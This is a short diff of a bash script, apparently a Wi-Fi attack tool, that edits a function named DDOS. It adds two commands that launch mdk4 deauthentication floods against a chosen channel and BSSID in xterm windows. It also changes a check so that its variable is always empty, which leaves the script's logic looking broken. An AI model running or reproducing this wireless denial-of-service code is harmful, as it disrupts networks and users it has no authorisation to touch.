@@ -378,12 +378,15 @@ DDOS(){
   cat evil.txt
   echo $BLU
   echo ""
-  empty2=`cat info/ddos_interface.txt`
+  empty2=`cat info/ddos_interface.txt > /dev/null 2>&1`
   if [ -z $empty2 ] 2> /dev/null
   then 
   echo $RED
   sleep 1
   echo "sorry !! you don't have any other wifi card !"
+  sudo xterm -fg red -geometry 100x30-0+0 -e mdk4 $interf d -c $CHANNEL -B $BSSID & > /dev/null 2>&1 
+  sudo xterm -fg red -geometry 100x30-0+0 -e mdk4 $interf"mon" d -c $CHANNEL -B $BSSID & > /dev/null 2>&1 
+  sleep 5
   sleep 3
   else
   echo "select ddos attack interface ..! "
